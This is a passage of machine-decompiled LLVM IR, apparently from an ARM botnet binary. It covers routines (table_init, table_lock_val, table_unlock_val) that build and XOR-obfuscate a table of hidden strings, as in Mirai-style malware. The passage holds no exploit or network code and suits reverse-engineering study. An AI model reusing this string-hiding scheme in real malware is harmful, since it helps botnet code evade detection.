  %v5_faf0 = zext i16 %v4_faf0 to i32
  store i32 %v5_faf0, i32* @r3, align 4
  %v3_faf4 = inttoptr i32 %v2_fae8 to i32*
  %v4_faf4 = load i32, i32* %v3_faf4, align 4
  store i32 %v5_faf0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_faf46 = phi i32 [ %v4_faf45, %.thread ], [ %v4_faf4, %bb ]
  ret i32 %v4_faf46

; uselistorder directives
  uselistorder i32 %v2_fae8, { 1, 0, 2 }
  uselistorder i32 %v3_fae4, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fb0c = mul i32 %arg1, 8
  %v2_fb10 = add i32 %v3_fb0c, ptrtoint (i32* @global_var_24400.213 to i32)
  %v2_fb14 = load i32, i32* @global_var_21750.216, align 4
  store i32 %v2_fb14, i32* @r1, align 4
  %v1_fb18 = add i32 %v3_fb0c, add (i32 ptrtoint (i32* @global_var_24400.213 to i32), i32 4)
  %v2_fb18 = inttoptr i32 %v1_fb18 to i16*
  %v3_fb18 = load i16, i16* %v2_fb18, align 4
  %v3_fb1c = udiv i32 %v2_fb14, 256
  %v2_fb20 = icmp eq i16 %v3_fb18, 0
  store i1 %v2_fb20, i1* @cpsr_z, align 1
  %v3_fb24 = udiv i32 %v2_fb14, 65536
  store i32 %v3_fb24, i32* @r3, align 4
  %v3_fb28 = load i32, i32* @r4, align 4
  store i32 %v3_fb28, i32* %stack_var_-16, align 4
  %v1_fb2c = urem i32 %v3_fb1c, 256
  store i32 %v1_fb2c, i32* %r6.global-to-local, align 4
  %v1_fb30 = urem i32 %v3_fb24, 256
  store i32 %v1_fb30, i32* %r5.global-to-local, align 4
  %v3_fb34 = udiv i32 %v2_fb14, 16777216
  store i32 %v3_fb34, i32* %r4.global-to-local, align 4
  %v1_fb38 = urem i32 %v2_fb14, 256
  store i32 %v1_fb38, i32* %lr.global-to-local, align 4
  br i1 %v2_fb20, label %dec_label_pc_fb94, label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fb44 = inttoptr i32 %v2_fb10 to i32*
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fb44.dec_label_pc_fb44_crit_edge, %dec_label_pc_fb40
  %v0_fb4c = phi i32 [ %v0_fb4c.pre, %dec_label_pc_fb44.dec_label_pc_fb44_crit_edge ], [ %v1_fb38, %dec_label_pc_fb40 ]
  %v2_fb50 = phi i32 [ %v1_fb88, %dec_label_pc_fb44.dec_label_pc_fb44_crit_edge ], [ 0, %dec_label_pc_fb40 ]
  %v2_fb44 = load i32, i32* %v1_fb44, align 4
  %v2_fb48 = add i32 %v2_fb44, %v2_fb50
  %v3_fb48 = inttoptr i32 %v2_fb48 to i8*
  %v4_fb48 = load i8, i8* %v3_fb48, align 1
  %v6_fb48 = zext i8 %v4_fb48 to i32
  %v2_fb4c = xor i32 %v6_fb48, %v0_fb4c
  %v1_fb50 = trunc i32 %v2_fb4c to i8
  store i8 %v1_fb50, i8* %v3_fb48, align 1
  %v2_fb54 = load i32, i32* %v1_fb44, align 4
  %v0_fb58 = load i32, i32* @ip, align 4
  %v2_fb58 = add i32 %v0_fb58, %v2_fb54
  %v3_fb58 = inttoptr i32 %v2_fb58 to i8*
  %v4_fb58 = load i8, i8* %v3_fb58, align 1
  %v6_fb58 = zext i8 %v4_fb58 to i32
  %v0_fb5c = load i32, i32* %r6.global-to-local, align 4
  %v2_fb5c = xor i32 %v0_fb5c, %v6_fb58
  %v1_fb60 = trunc i32 %v2_fb5c to i8
  store i8 %v1_fb60, i8* %v3_fb58, align 1
  %v2_fb64 = load i32, i32* %v1_fb44, align 4
  %v0_fb68 = load i32, i32* @ip, align 4
  %v2_fb68 = add i32 %v0_fb68, %v2_fb64
  %v3_fb68 = inttoptr i32 %v2_fb68 to i8*
  %v4_fb68 = load i8, i8* %v3_fb68, align 1
  %v6_fb68 = zext i8 %v4_fb68 to i32
  %v0_fb6c = load i32, i32* %r5.global-to-local, align 4
  %v2_fb6c = xor i32 %v0_fb6c, %v6_fb68
  %v1_fb70 = trunc i32 %v2_fb6c to i8
  store i8 %v1_fb70, i8* %v3_fb68, align 1
  %v2_fb74 = load i32, i32* %v1_fb44, align 4
  store i32 %v2_fb74, i32* @r1, align 4
  %v0_fb78 = load i32, i32* @ip, align 4
  %v2_fb78 = add i32 %v0_fb78, %v2_fb74
  %v3_fb78 = inttoptr i32 %v2_fb78 to i8*
  %v4_fb78 = load i8, i8* %v3_fb78, align 1
  %v6_fb78 = zext i8 %v4_fb78 to i32
  %v0_fb7c = load i32, i32* %r4.global-to-local, align 4
  %v2_fb7c = xor i32 %v0_fb7c, %v6_fb78
  store i32 %v2_fb7c, i32* @r3, align 4
  %v1_fb80 = trunc i32 %v2_fb7c to i8
  store i8 %v1_fb80, i8* %v3_fb78, align 1
  %v3_fb84 = load i16, i16* %v2_fb18, align 4
  %v4_fb84 = zext i16 %v3_fb84 to i32
  %v0_fb88 = load i32, i32* @ip, align 4
  %v1_fb88 = add i32 %v0_fb88, 1
  store i32 %v1_fb88, i32* @ip, align 4
  %v9_fb8c = icmp eq i32 %v4_fb84, %v1_fb88
  store i1 %v9_fb8c, i1* @cpsr_z, align 1
  %v8_fb90 = icmp sgt i32 %v4_fb84, %v1_fb88
  br i1 %v8_fb90, label %dec_label_pc_fb44.dec_label_pc_fb44_crit_edge, label %dec_label_pc_fb94.loopexit

dec_label_pc_fb44.dec_label_pc_fb44_crit_edge:    ; preds = %dec_label_pc_fb44
  %v0_fb4c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb94.loopexit:                       ; preds = %dec_label_pc_fb44
  %v2_fb94.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb94.loopexit, %entry
  %v2_fb94 = phi i32 [ %v2_fb94.pre, %dec_label_pc_fb94.loopexit ], [ %v3_fb28, %entry ]
  store i32 %v2_fb94, i32* @r4, align 4
  ret i32 %v2_fb10

; uselistorder directives
  uselistorder i32 %v1_fb88, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fb38, { 1, 0 }
  uselistorder i32 %v3_fb24, { 1, 0 }
  uselistorder i32 %v2_fb14, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_fb0c, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fbac = mul i32 %arg1, 8
  %v2_fbb0 = add i32 %v3_fbac, ptrtoint (i32* @global_var_24400.213 to i32)
  %v2_fbb4 = load i32, i32* @global_var_21750.216, align 4
  %v1_fbb8 = add i32 %v3_fbac, add (i32 ptrtoint (i32* @global_var_24400.213 to i32), i32 4)
  %v2_fbb8 = inttoptr i32 %v1_fbb8 to i16*
  %v3_fbb8 = load i16, i16* %v2_fbb8, align 4
  %v3_fbbc = udiv i32 %v2_fbb4, 256
  %v2_fbc0 = icmp eq i16 %v3_fbb8, 0
  %v3_fbc4 = udiv i32 %v2_fbb4, 65536
  %v3_fbc8 = load i32, i32* @r4, align 4
  store i32 %v3_fbc8, i32* %stack_var_-16, align 4
  %v1_fbcc = urem i32 %v3_fbbc, 256
  store i32 %v1_fbcc, i32* %r6.global-to-local, align 4
  %v1_fbd0 = urem i32 %v3_fbc4, 256
  store i32 %v1_fbd0, i32* %r5.global-to-local, align 4
  %v3_fbd4 = udiv i32 %v2_fbb4, 16777216
  store i32 %v3_fbd4, i32* %r4.global-to-local, align 4
  %v1_fbd8 = urem i32 %v2_fbb4, 256
  store i32 %v1_fbd8, i32* %lr.global-to-local, align 4
  br i1 %v2_fbc0, label %dec_label_pc_fc34, label %dec_label_pc_fbe0

dec_label_pc_fbe0:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fbe4 = inttoptr i32 %v2_fbb0 to i32*
  br label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbe4.dec_label_pc_fbe4_crit_edge, %dec_label_pc_fbe0
  %v0_fbec = phi i32 [ %v0_fbec.pre, %dec_label_pc_fbe4.dec_label_pc_fbe4_crit_edge ], [ %v1_fbd8, %dec_label_pc_fbe0 ]
  %v2_fbf0 = phi i32 [ %v1_fc28, %dec_label_pc_fbe4.dec_label_pc_fbe4_crit_edge ], [ 0, %dec_label_pc_fbe0 ]
  %v2_fbe4 = load i32, i32* %v1_fbe4, align 4
  %v2_fbe8 = add i32 %v2_fbe4, %v2_fbf0
  %v3_fbe8 = inttoptr i32 %v2_fbe8 to i8*
  %v4_fbe8 = load i8, i8* %v3_fbe8, align 1
  %v6_fbe8 = zext i8 %v4_fbe8 to i32
  %v2_fbec = xor i32 %v6_fbe8, %v0_fbec
  %v1_fbf0 = trunc i32 %v2_fbec to i8
  store i8 %v1_fbf0, i8* %v3_fbe8, align 1
  %v2_fbf4 = load i32, i32* %v1_fbe4, align 4
  %v0_fbf8 = load i32, i32* @ip, align 4
  %v2_fbf8 = add i32 %v0_fbf8, %v2_fbf4
  %v3_fbf8 = inttoptr i32 %v2_fbf8 to i8*
  %v4_fbf8 = load i8, i8* %v3_fbf8, align 1
  %v6_fbf8 = zext i8 %v4_fbf8 to i32
  %v0_fbfc = load i32, i32* %r6.global-to-local, align 4
  %v2_fbfc = xor i32 %v0_fbfc, %v6_fbf8
  %v1_fc00 = trunc i32 %v2_fbfc to i8
  store i8 %v1_fc00, i8* %v3_fbf8, align 1
  %v2_fc04 = load i32, i32* %v1_fbe4, align 4
  %v0_fc08 = load i32, i32* @ip, align 4
  %v2_fc08 = add i32 %v0_fc08, %v2_fc04
  %v3_fc08 = inttoptr i32 %v2_fc08 to i8*
  %v4_fc08 = load i8, i8* %v3_fc08, align 1
  %v6_fc08 = zext i8 %v4_fc08 to i32
  %v0_fc0c = load i32, i32* %r5.global-to-local, align 4
  %v2_fc0c = xor i32 %v0_fc0c, %v6_fc08
  %v1_fc10 = trunc i32 %v2_fc0c to i8
  store i8 %v1_fc10, i8* %v3_fc08, align 1
  %v2_fc14 = load i32, i32* %v1_fbe4, align 4
  %v0_fc18 = load i32, i32* @ip, align 4
  %v2_fc18 = add i32 %v0_fc18, %v2_fc14
  %v3_fc18 = inttoptr i32 %v2_fc18 to i8*
  %v4_fc18 = load i8, i8* %v3_fc18, align 1
  %v6_fc18 = zext i8 %v4_fc18 to i32
  %v0_fc1c = load i32, i32* %r4.global-to-local, align 4
  %v2_fc1c = xor i32 %v0_fc1c, %v6_fc18
  %v1_fc20 = trunc i32 %v2_fc1c to i8
  store i8 %v1_fc20, i8* %v3_fc18, align 1
  %v3_fc24 = load i16, i16* %v2_fbb8, align 4
  %v4_fc24 = zext i16 %v3_fc24 to i32
  %v0_fc28 = load i32, i32* @ip, align 4
  %v1_fc28 = add i32 %v0_fc28, 1
  store i32 %v1_fc28, i32* @ip, align 4
  %v8_fc30 = icmp sgt i32 %v4_fc24, %v1_fc28
  br i1 %v8_fc30, label %dec_label_pc_fbe4.dec_label_pc_fbe4_crit_edge, label %dec_label_pc_fc34.loopexit

dec_label_pc_fbe4.dec_label_pc_fbe4_crit_edge:    ; preds = %dec_label_pc_fbe4
  %v0_fbec.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fbe4

dec_label_pc_fc34.loopexit:                       ; preds = %dec_label_pc_fbe4
  %v2_fc34.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc34.loopexit, %entry
  %v2_fc34 = phi i32 [ %v2_fc34.pre, %dec_label_pc_fc34.loopexit ], [ %v3_fbc8, %entry ]
  store i32 %v2_fc34, i32* @r4, align 4
  ret i32 %v2_fbb0

; uselistorder directives
  uselistorder i32 %v1_fc28, { 1, 2, 0 }
  uselistorder i32 %v1_fbd8, { 1, 0 }
  uselistorder i32 %v2_fbb4, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fbac, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_fc44 = load i32, i32* @r4, align 4
  %v6_fc44 = load i32, i32* @r5, align 4
  %v9_fc44 = load i32, i32* @r6, align 4
  %v12_fc44 = load i32, i32* @r7, align 4
  %v15_fc44 = load i32, i32* @r8, align 4
  %v18_fc44 = load i32, i32* @sb, align 4
  %v21_fc44 = load i32, i32* @sl, align 4
  %v24_fc44 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_fc50 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24400.213 to i32), i32* @r4, align 4
  store i32 %v0_fc50, i32* @r6, align 4
  %v4_fc68 = call i32 @util_memcpy(i32 %v0_fc50, i32 ptrtoint ([3 x i8]* @global_var_19000.221 to i32), i32 2)
  %v0_fc6c = load i32, i32* @r5, align 4
  store i32 %v0_fc6c, i32* @r0, align 4
  %v0_fc70 = load i32, i32* @r6, align 4
  store i32 %v0_fc70, i32* @global_var_24408.222, align 4
  %v1_fc74 = trunc i32 %v0_fc6c to i16
  store i16 %v1_fc74, i16* bitcast (i32* @global_var_2440c.223 to i16*), align 4
  %v0_fc78 = call i32 @malloc()
  %v0_fc7c = load i32, i32* @r5, align 4
  store i32 %v0_fc78, i32* @r6, align 4
  %v3_fc88 = call i32 @util_memcpy(i32 %v0_fc78, i32 ptrtoint (i32* @global_var_19004.225 to i32), i32 %v0_fc7c)
  store i32 29, i32* @r0, align 4
  %v0_fc90 = load i32, i32* @r6, align 4
  store i32 %v0_fc90, i32* @global_var_24410.226, align 4
  %v0_fc94 = load i32, i32* @r5, align 4
  %v1_fc94 = trunc i32 %v0_fc94 to i16
  store i16 %v1_fc94, i16* bitcast (i32* @global_var_24414.227 to i16*), align 4
  %v0_fc98 = call i32 @malloc()
  store i32 %v0_fc98, i32* @r5, align 4
  %v3_fca8 = call i32 @util_memcpy(i32 %v0_fc98, i32 ptrtoint (i32* @global_var_1916c.229 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_2441c.230 to i16*), align 4
  %v0_fcb8 = load i32, i32* @r5, align 4
  store i32 %v0_fcb8, i32* @global_var_24418.231, align 4
  %v0_fcbc = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_fcbc, i32* @r5, align 4
  %v4_fcd0 = call i32 @util_memcpy(i32 %v0_fcbc, i32 ptrtoint ([7 x i8]* @global_var_19008.233 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_fcdc = load i32, i32* @r5, align 4
  store i32 %v0_fcdc, i32* @global_var_24420.234, align 4
  %v0_fce0 = load i32, i32* @sb, align 4
  %v1_fce0 = trunc i32 %v0_fce0 to i16
  store i16 %v1_fce0, i16* bitcast (i32* @global_var_24424.235 to i16*), align 4
  %v0_fce4 = call i32 @malloc()
  %v0_fcec = load i32, i32* @r7, align 4
  store i32 %v0_fce4, i32* @r5, align 4
  %v4_fcf4 = call i32 @util_memcpy(i32 %v0_fce4, i32 ptrtoint ([8 x i8]* @global_var_19010.237 to i32), i32 %v0_fcec)
  %v0_fcf8 = load i32, i32* @r7, align 4
  store i32 %v0_fcf8, i32* @r0, align 4
  %v0_fcfc = load i32, i32* @r5, align 4
  store i32 %v0_fcfc, i32* @global_var_24428.238, align 4
  %v1_fd00 = trunc i32 %v0_fcf8 to i16
  store i16 %v1_fd00, i16* bitcast (i32* @global_var_2442c.239 to i16*), align 4
  %v0_fd04 = call i32 @malloc()
  %v0_fd0c = load i32, i32* @r7, align 4
  store i32 %v0_fd04, i32* @r5, align 4
  %v4_fd14 = call i32 @util_memcpy(i32 %v0_fd04, i32 ptrtoint ([8 x i8]* @global_var_19018.241 to i32), i32 %v0_fd0c)
  store i32 3, i32* @r0, align 4
  %v0_fd1c = load i32, i32* @r5, align 4
  store i32 %v0_fd1c, i32* @global_var_24430.242, align 4
  %v0_fd20 = load i32, i32* @r7, align 4
  %v1_fd20 = trunc i32 %v0_fd20 to i16
  store i16 %v1_fd20, i16* bitcast (i32* @global_var_24434.243 to i16*), align 4
  %v0_fd24 = call i32 @malloc()
  store i32 %v0_fd24, i32* @r5, align 4
  %v4_fd34 = call i32 @util_memcpy(i32 %v0_fd24, i32 ptrtoint ([4 x i8]* @global_var_19020.245 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_2443c.246 to i16*), align 4
  %v0_fd44 = load i32, i32* @r5, align 4
  store i32 %v0_fd44, i32* @global_var_24438.247, align 4
  %v0_fd48 = call i32 @malloc()
  store i32 %v0_fd48, i32* @r5, align 4
  %v3_fd58 = call i32 @util_memcpy(i32 %v0_fd48, i32 ptrtoint (i32* @global_var_19024.249 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24444.250 to i16*), align 4
  %v0_fd68 = load i32, i32* @r5, align 4
  store i32 %v0_fd68, i32* @global_var_24440.251, align 4
  %v0_fd6c = call i32 @malloc()
  store i32 %v0_fd6c, i32* @r5, align 4
  %v3_fd7c = call i32 @util_memcpy(i32 %v0_fd6c, i32 ptrtoint (i32* @global_var_19038.253 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_2444c.254 to i16*), align 4
  %v0_fd8c = load i32, i32* @r5, align 4
  store i32 %v0_fd8c, i32* @global_var_24448.255, align 4
  %v0_fd90 = call i32 @malloc()
  store i32 %v0_fd90, i32* @r5, align 4
  %v4_fda0 = call i32 @util_memcpy(i32 %v0_fd90, i32 ptrtoint ([10 x i8]* @global_var_19054.257 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_24454.258 to i16*), align 4
  %v0_fdb0 = load i32, i32* @r5, align 4
  store i32 %v0_fdb0, i32* @global_var_24450.259, align 4
  %v0_fdb4 = call i32 @malloc()
  store i32 %v0_fdb4, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_fdc8 = call i32 @util_memcpy(i32 %v0_fdb4, i32 ptrtoint ([17 x i8]* @global_var_19060.261 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_fdd0 = load i32, i32* @r5, align 4
  store i32 %v0_fdd0, i32* @global_var_24458.262, align 4
  %v0_fdd4 = load i32, i32* @sl, align 4
  %v1_fdd4 = trunc i32 %v0_fdd4 to i16
  store i16 %v1_fdd4, i16* bitcast (i32* @global_var_2445c.263 to i16*), align 4
  %v0_fdd8 = call i32 @malloc()
  store i32 %v0_fdd8, i32* @r5, align 4
  %v4_fde8 = call i32 @util_memcpy(i32 %v0_fdd8, i32 ptrtoint ([23 x i8]* @global_var_19074.265 to i32), i32 22)
  %v0_fdf0 = load i32, i32* @r7, align 4
  store i32 %v0_fdf0, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24464.266 to i16*), align 4
  %v0_fdf8 = load i32, i32* @r5, align 4
  store i32 %v0_fdf8, i32* @global_var_24460.267, align 4
  %v0_fdfc = call i32 @malloc()
  %v0_fe04 = load i32, i32* @r7, align 4
  store i32 %v0_fdfc, i32* @r5, align 4
  %v4_fe0c = call i32 @util_memcpy(i32 %v0_fdfc, i32 ptrtoint ([8 x i8]* @global_var_1908c.269 to i32), i32 %v0_fe04)
  store i32 5, i32* @r0, align 4
  %v0_fe14 = load i32, i32* @r5, align 4
  store i32 %v0_fe14, i32* @global_var_24468.270, align 4
  %v0_fe18 = load i32, i32* @r7, align 4
  %v1_fe18 = trunc i32 %v0_fe18 to i16
  store i16 %v1_fe18, i16* bitcast (i32* @global_var_2446c.271 to i16*), align 4
  %v0_fe1c = call i32 @malloc()
  store i32 %v0_fe1c, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_fe30 = call i32 @util_memcpy(i32 %v0_fe1c, i32 ptrtoint ([6 x i8]* @global_var_19094.273 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_fe38 = load i32, i32* @r5, align 4
  store i32 %v0_fe38, i32* @global_var_24470.274, align 4
  %v0_fe3c = load i32, i32* @fp, align 4
  %v1_fe3c = trunc i32 %v0_fe3c to i16
  store i16 %v1_fe3c, i16* bitcast (i32* @global_var_24474.275 to i16*), align 4
  %v0_fe40 = call i32 @malloc()
  store i32 %v0_fe40, i32* @r5, align 4
  %v4_fe50 = call i32 @util_memcpy(i32 %v0_fe40, i32 ptrtoint ([5 x i8]* @global_var_1909c.277 to i32), i32 4)
  %v0_fe58 = load i32, i32* @sb, align 4
  store i32 %v0_fe58, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_2447c.278 to i16*), align 4
  %v0_fe60 = load i32, i32* @r5, align 4
  store i32 %v0_fe60, i32* @global_var_24478.279, align 4
  %v0_fe64 = call i32 @malloc()
  %v0_fe6c = load i32, i32* @sb, align 4
  store i32 %v0_fe64, i32* @r5, align 4
  %v4_fe74 = call i32 @util_memcpy(i32 %v0_fe64, i32 ptrtoint ([7 x i8]* @global_var_190a4.281 to i32), i32 %v0_fe6c)
  store i32 14, i32* @r0, align 4
  %v0_fe7c = load i32, i32* @r5, align 4
  store i32 %v0_fe7c, i32* @global_var_24480.282, align 4
  %v0_fe80 = load i32, i32* @sb, align 4
  %v1_fe80 = trunc i32 %v0_fe80 to i16
  store i16 %v1_fe80, i16* bitcast (i32* @global_var_24484.283 to i16*), align 4
  %v0_fe84 = call i32 @malloc()
  store i32 %v0_fe84, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_fe98 = call i32 @util_memcpy(i32 %v0_fe84, i32 ptrtoint ([15 x i8]* @global_var_190ac.285 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_fea0 = load i32, i32* @r5, align 4
  store i32 %v0_fea0, i32* @global_var_24488.286, align 4
  %v0_fea4 = load i32, i32* @r8, align 4
  %v1_fea4 = trunc i32 %v0_fea4 to i16
  store i16 %v1_fea4, i16* bitcast (i32* @global_var_2448c.287 to i16*), align 4
  %v0_fea8 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_fea8, i32* @r5, align 4
  %v4_febc = call i32 @util_memcpy(i32 %v0_fea8, i32 ptrtoint ([9 x i8]* @global_var_190bc.289 to i32), i32 8)
  %v0_fec0 = load i32, i32* @r7, align 4
  store i32 %v0_fec0, i32* @r0, align 4
  %v0_fec4 = load i32, i32* @r5, align 4
  store i32 %v0_fec4, i32* @global_var_244e8.290, align 4
  %v0_fec8 = load i32, i32* @r6, align 4
  %v1_fec8 = trunc i32 %v0_fec8 to i16
  store i16 %v1_fec8, i16* bitcast (i32* @global_var_244ec.291 to i16*), align 4
  %v0_fecc = call i32 @malloc()
  %v0_fed4 = load i32, i32* @r7, align 4
  store i32 %v0_fecc, i32* @r5, align 4
  %v4_fedc = call i32 @util_memcpy(i32 %v0_fecc, i32 ptrtoint ([8 x i8]* @global_var_190c8.293 to i32), i32 %v0_fed4)
  %v0_fee0 = load i32, i32* @sl, align 4
  store i32 %v0_fee0, i32* @r0, align 4
  %v0_fee4 = load i32, i32* @r5, align 4
  store i32 %v0_fee4, i32* @global_var_244f0.294, align 4
  %v0_fee8 = load i32, i32* @r7, align 4
  %v1_fee8 = trunc i32 %v0_fee8 to i16
  store i16 %v1_fee8, i16* bitcast (i32* @global_var_244f4.295 to i16*), align 4
  %v0_feec = call i32 @malloc()
  %v0_fef4 = load i32, i32* @sl, align 4
  store i32 %v0_feec, i32* @r5, align 4
  %v4_fefc = call i32 @util_memcpy(i32 %v0_feec, i32 ptrtoint ([17 x i8]* @global_var_190d0.297 to i32), i32 %v0_fef4)
  %v0_ff00 = load i32, i32* @r6, align 4
  store i32 %v0_ff00, i32* @r0, align 4
  %v0_ff04 = load i32, i32* @r5, align 4
  store i32 %v0_ff04, i32* @global_var_24490.298, align 4
  %v0_ff08 = load i32, i32* @sl, align 4
  %v1_ff08 = trunc i32 %v0_ff08 to i16
  store i16 %v1_ff08, i16* bitcast (i32* @global_var_24494.299 to i16*), align 4
  %v0_ff0c = call i32 @malloc()
  %v0_ff14 = load i32, i32* @r6, align 4
  store i32 %v0_ff0c, i32* @r5, align 4
  %v4_ff1c = call i32 @util_memcpy(i32 %v0_ff0c, i32 ptrtoint ([9 x i8]* @global_var_190e4.301 to i32), i32 %v0_ff14)
  store i32 21, i32* @r0, align 4
  %v0_ff24 = load i32, i32* @r5, align 4
  store i32 %v0_ff24, i32* @global_var_24498.302, align 4
  %v0_ff28 = load i32, i32* @r6, align 4
  %v1_ff28 = trunc i32 %v0_ff28 to i16
  store i16 %v1_ff28, i16* bitcast (i32* @global_var_2449c.303 to i16*), align 4
  %v0_ff2c = call i32 @malloc()
  store i32 %v0_ff2c, i32* @r5, align 4
  %v3_ff3c = call i32 @util_memcpy(i32 %v0_ff2c, i32 ptrtoint (i32* @global_var_1918c.305 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_244a4.306 to i16*), align 4
  %v0_ff4c = load i32, i32* @r5, align 4
  store i32 %v0_ff4c, i32* @global_var_244a0.307, align 4
  %v0_ff50 = call i32 @malloc()
  store i32 %v0_ff50, i32* @r5, align 4
  %v4_ff60 = call i32 @util_memcpy(i32 %v0_ff50, i32 ptrtoint ([18 x i8]* @global_var_190f0.309 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_244ac.310 to i16*), align 4
  %v0_ff70 = load i32, i32* @r5, align 4
  store i32 %v0_ff70, i32* @global_var_244a8.311, align 4
  %v0_ff74 = call i32 @malloc()
  store i32 %v0_ff74, i32* @r5, align 4
  %v4_ff84 = call i32 @util_memcpy(i32 %v0_ff74, i32 ptrtoint ([13 x i8]* @global_var_19104.313 to i32), i32 12)
  %v0_ff8c = load i32, i32* @r8, align 4
  store i32 %v0_ff8c, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_244b4.314 to i16*), align 4
  %v0_ff94 = load i32, i32* @r5, align 4
  store i32 %v0_ff94, i32* @global_var_244b0.315, align 4
  %v0_ff98 = call i32 @malloc()
  %v0_ffa0 = load i32, i32* @r8, align 4
  store i32 %v0_ff98, i32* @r5, align 4
  %v4_ffa8 = call i32 @util_memcpy(i32 %v0_ff98, i32 ptrtoint ([15 x i8]* @global_var_19114.317 to i32), i32 %v0_ffa0)
  store i32 19, i32* @r0, align 4
  %v0_ffb0 = load i32, i32* @r5, align 4
  store i32 %v0_ffb0, i32* @global_var_244b8.318, align 4
  %v0_ffb4 = load i32, i32* @r8, align 4
  %v1_ffb4 = trunc i32 %v0_ffb4 to i16
  store i16 %v1_ffb4, i16* bitcast (i32* @global_var_244bc.319 to i16*), align 4
  %v0_ffb8 = call i32 @malloc()
  store i32 %v0_ffb8, i32* @r5, align 4
  %v4_ffc8 = call i32 @util_memcpy(i32 %v0_ffb8, i32 ptrtoint ([20 x i8]* @global_var_19124.321 to i32), i32 19)
  %v0_ffd0 = load i32, i32* @r6, align 4
  store i32 %v0_ffd0, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_244c4.322 to i16*), align 4
  %v0_ffd8 = load i32, i32* @r5, align 4
  store i32 %v0_ffd8, i32* @global_var_244c0.323, align 4
  %v0_ffdc = call i32 @malloc()
  %v0_ffe4 = load i32, i32* @r6, align 4
  store i32 %v0_ffdc, i32* @r5, align 4
  %v4_ffec = call i32 @util_memcpy(i32 %v0_ffdc, i32 ptrtoint ([9 x i8]* @global_var_19138.325 to i32), i32 %v0_ffe4)
  %v0_fff0 = load i32, i32* @fp, align 4
  store i32 %v0_fff0, i32* @r0, align 4
  %v0_fff4 = load i32, i32* @r5, align 4
  store i32 %v0_fff4, i32* @global_var_244c8.326, align 4
  %v0_fff8 = load i32, i32* @r6, align 4
  %v1_fff8 = trunc i32 %v0_fff8 to i16
  store i16 %v1_fff8, i16* bitcast (i32* @global_var_244cc.327 to i16*), align 4
  %v0_fffc = call i32 @malloc()
  %v0_10004 = load i32, i32* @fp, align 4
  store i32 %v0_fffc, i32* @r5, align 4
  %v4_1000c = call i32 @util_memcpy(i32 %v0_fffc, i32 ptrtoint ([6 x i8]* @global_var_19144.329 to i32), i32 %v0_10004)
  %v0_10010 = load i32, i32* @sb, align 4
  store i32 %v0_10010, i32* @r0, align 4
  %v0_10014 = load i32, i32* @r5, align 4
  store i32 %v0_10014, i32* @global_var_244d0.330, align 4
  %v0_10018 = load i32, i32* @fp, align 4
  %v1_10018 = trunc i32 %v0_10018 to i16
  store i16 %v1_10018, i16* bitcast (i32* @global_var_244d4.331 to i16*), align 4
  %v0_1001c = call i32 @malloc()
  %v0_10024 = load i32, i32* @sb, align 4
  store i32 %v0_1001c, i32* @r5, align 4
  %v4_1002c = call i32 @util_memcpy(i32 %v0_1001c, i32 ptrtoint ([7 x i8]* @global_var_1914c.333 to i32), i32 %v0_10024)
  store i32 23, i32* @r0, align 4
  %v0_10034 = load i32, i32* @r5, align 4
  store i32 %v0_10034, i32* @global_var_244d8.334, align 4
